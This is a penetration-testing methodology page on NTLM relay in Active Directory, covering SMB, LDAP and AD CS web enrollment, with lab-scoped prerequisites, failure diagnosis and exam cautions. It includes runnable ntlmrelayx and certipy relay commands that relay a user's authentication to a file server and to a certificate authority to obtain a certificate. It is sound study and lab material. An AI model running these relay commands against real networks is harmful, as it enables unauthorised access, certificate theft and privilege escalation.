# NTLM relay: service prerequisites and proof

[← AD quick reference](../05-active-directory.md) · [NT vs NetNTLM material](../windows/ntlm.md) · [Capture triggers](../windows/ntlm-capture.md) · [AD CS](adcs.md)

Record the authenticating principal, source host/protocol, listener address, destination service, relayed identity's rights, and observed signing/binding requirements. Relay uses a **live** NTLM exchange with the destination's challenge. A captured response file cannot simply be replayed to a different challenge.

## Distinguish the paths

| Path | Input | Result |
| --- | --- | --- |
| Offline cracking | Captured NetNTLM challenge-response | A recovered password if a candidate matches |
| Pass the Hash | Account NT key | A new authentication where the protocol/tool permits it |
| Relay | Live source authentication and suitable destination | An authenticated destination session as the source principal |
| Coercion / induced authentication | A behavior causing another process to connect | A connection attempt; it still needs an independently valid capture/relay destination |

Neither a connection nor successful authentication establishes permission to dump secrets, edit LDAP, enroll for a certificate, or execute remotely. See [credential-material distinctions](../windows/ntlm.md).

## Check the destination and source independently

| Destination | Requirements to investigate | Typical blocker |
| --- | --- | --- |
| SMB | NTLM accepted, signing not required for the ordinary relay route, and relevant share/service rights | Required signing, NTLM restriction, or insufficient resource rights |
| LDAP | Accepted NTLM SASL exchange, applicable signing requirements, and exact object rights | Required LDAP signing or incompatible source negotiate flags |
| LDAPS | TLS reachable/trusted as applicable, compatible authentication, and object rights | Required channel binding; TLS alone does not settle relay applicability |
| AD CS HTTP enrollment | Enrollment endpoint accepts NTLM, EPA/binding does not block the route, usable template and enrollment rights | EPA, NTLM disabled, absent endpoint/template, approval requirements |

Source-side requirements also matter: outbound NTLM/signing policy, whether the triggering process sends a user or machine identity, and a route to the listener. SMB settings can require inbound, outbound, both, or neither signing. Windows 11 24H2 Pro/Enterprise/Education and Windows Server 2025 do not have identical defaults. Measure the relevant service rather than infer relay feasibility from an OS label. [Microsoft SMB signing](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing).

LDAP signing and LDAPS channel binding are separate controls. Changing `ldap://` to `ldaps://` is not a guaranteed fix, nor does disabled SMB signing prove LDAP relay will work. [Microsoft LDAP signing](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-ldap-signing-in-windows-server), [LDAP channel-binding guidance](https://support.microsoft.com/en-us/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a), [Impacket LDAP relay implementation](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/ldaprelayclient.py).

## Establish routes and listener conflicts

From Kali, query one intended SMB target and the actual enrollment endpoint as appropriate:

```bash
nxc smb fs01.corp.example
curl -I http://ca01.corp.example/certsrv/
ip route get <SOURCE-IP>
sudo ss -ltnp '( sport = :445 or sport = :80 )'
```

Record the signing result, protocol versions, HTTP status, and `WWW-Authenticate` behavior. An HTTP NTLM challenge is evidence of an endpoint, not proof of enrollment rights or missing EPA. A signing observation does not establish administrator access.

Decide which process owns each listening port. Responder capture and `ntlmrelayx` cannot both own the same TCP 445 listener. If using Responder poisoning in a permitted lab, disable its competing SMB/HTTP servers in the actual configuration before starting the relay listener. For the explicit-IP lab trigger below, a separate poisoning process is unnecessary.

## Worked SMB route: relay one lab user, read one known resource

Prerequisites: a controlled test user is allowed to access FS01's `LabEvidence` share; FS01 accepts NTLM without required server signing; the test client's outbound policy permits this exchange; the client can reach the listener. This example uses an interactive SMB client so the operator chooses the read operation.

Check the installed tool first:

```bash
impacket-ntlmrelayx -h
```

The following server-disable flags exist in the reviewed upstream version. Earlier releases may have fewer server types; adapt to their help and disable each unused listener supported by that release.

```bash
sudo impacket-ntlmrelayx -t smb://fs01.corp.example -smb2support -i \
  -ip <LISTENER-IP> --no-http-server --no-wcf-server --no-raw-server \
  --no-rpc-server --no-winrm-server --no-mssql-server --no-rdp-server
```

In a separate, explicitly controlled lab-user session on the source Windows host:

```cmd
whoami
dir \\<LISTENER-IP>\probe
```

The directory request can fail at the source while still having supplied a live authentication. Inspect the relay log for the **actual** source account, destination, successful authentication, and the locally printed interactive-console port. Stop if the account differs from the planned lab user.

On Kali, connect to that printed local port:

```bash
nc 127.0.0.1 <PRINTED-CONSOLE-PORT>
```

Then perform only the intended read:

```text
shares
use LabEvidence
ls
exit
```

Verify that the target session corresponds to the logged lab identity and that the resource is known to require that identity's access. This establishes a relayed resource-access path; it does not establish unrestricted administrative execution. In the reviewed SMB attack implementation, interactive mode opens a local SMB console before the normal automatic attack path. Without selecting the right mode, the default SMB action can attempt SAM extraction. [ntlmrelayx options](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), [SMB relay attack implementation](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/smbattack.py).

After the proof, close the console and stop the relay listener. Remove created local logs/output only after required evidence is retained. There was no target-file or directory-object edit in this read-only example.

## LDAP route: choose the action from confirmed object rights

An accepted LDAP bind gives the relayed principal's directory permissions. It does not automatically give domain-admin privileges. Before configuring any action, identify the exact target and whether the desired write is permitted:

- Group membership or DACL edits: [object rights](object-rights.md).
- RBCD: preserve the target's descriptor and follow [delegation restoration](delegation.md#rbcd-preserve-the-descriptor-add-one-principal-restore).
- gMSA/LAPS reads: verify retrieval/decryption rights in [managed credentials](managed-credentials.md).

Review `ntlmrelayx`'s installed LDAP defaults before launching it. `--no-dump`, `--no-da`, and `--no-acl` control distinct default actions; a bind-only plan must not silently attempt an ACL or group change. Flag existence and protocol support vary by version. An interactive LDAP shell likewise grants only the relayed account's rights. [LDAP action implementation](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/ldapattack.py).

Do not use blanket certificate-validation changes or vulnerable-protocol downgrade switches to explain away a failed baseline. Establish the required service and policy conditions first; patch-specific bypasses need their own verified prerequisites.

## AD CS relay: ESC8 follow-through

Confirm a reachable Web Enrollment endpoint, accepted NTLM, EPA behavior, and a published authentication-capable template enrollable by the expected source account. HTTPS without effective EPA is not equivalent to relay protection. [Microsoft AD CS relay mitigation](https://support.microsoft.com/en-us/servicing/os/windows-server/2021/07/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs).

For a controlled ordinary user and a confirmed `User` template in a disposable lab:

```bash
certipy relay -h
sudo certipy relay -target http://ca01.corp.example -template User \
  -interface <LISTENER-IP> -port 445 -out labuser-relay
```

Trigger the same explicit lab authentication, then inspect the reported relayed identity, CA request ID, certificate identity, output PFX path, and any issuance failure. Select templates for the actual principal: user, member-computer, and DC enrollment rights/templates can differ. Never infer a DC certificate from any arbitrary machine-account authentication. [Certipy relay options](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).

Use the actual issued filename and the [AD CS authentication checks](adcs.md) to confirm that the certificate maps to the expected identity:

```bash
certipy auth -pfx <PRINTED-PFX-PATH> -dc-ip <DC-IP> -no-hash -no-save
```

The two flags limit this proof to certificate authentication without NT-hash retrieval or a saved TGT. [Certipy auth behavior](https://github.com/ly4k/Certipy/blob/master/certipy/commands/auth.py). Issuance can succeed while PKINIT or Schannel authentication fails. Keep SID mapping, trust, EKU, certificate lifetime, and DC support separate from the relay step. Stop the relay listener after the intended proof. Removing local PFX files does not revoke the issued certificate; record the request ID and arrange CA-side revocation where lab cleanup requires it and the responsible operator has that permission.

## Failure diagnosis

| Symptom | Check next |
| --- | --- |
| No source connection | Actual trigger, source process, routing/firewall, reachable listener IP, and bound port |
| Source sends another identity | User versus service/machine process context and the authentication mechanism |
| SMB requires signing | Measured target/source signing requirements; the ordinary route is inapplicable |
| Authentication accepted, action denied | Actual relayed identity and share/service/object/enrollment rights |
| LDAP `strongerAuthRequired` | Signing/SASL requirements and supported protected transport; LDAPS channel binding remains relevant |
| LDAP/HTTP authentication rejected | NTLM restrictions, channel binding/EPA, negotiate flags, and service protocol compatibility |
| Certificate request rejected | Template publication/name, principal enrollment rights, authentication EKU, approval/signature gates |
| Certificate issued, auth fails | [Certificate identity and DC checks](adcs.md), not repeated relay attempts |

## Version, exam, and validation notes

Review date: 2026-10-02, against upstream Impacket and Certipy source/documentation. Record actual versions with `python3 -m pip show impacket certipy-ad`, save local help, and label the source/DC patch state in lab evidence. No live relay or certificate request was performed while preparing these notes; execution remains pending isolated-lab validation.

For an exam, consult the current [OffSec guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) and [FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ) before using poisoning, coercion, relay, or automatic actions. A tool name alone does not settle whether a particular feature is permitted.
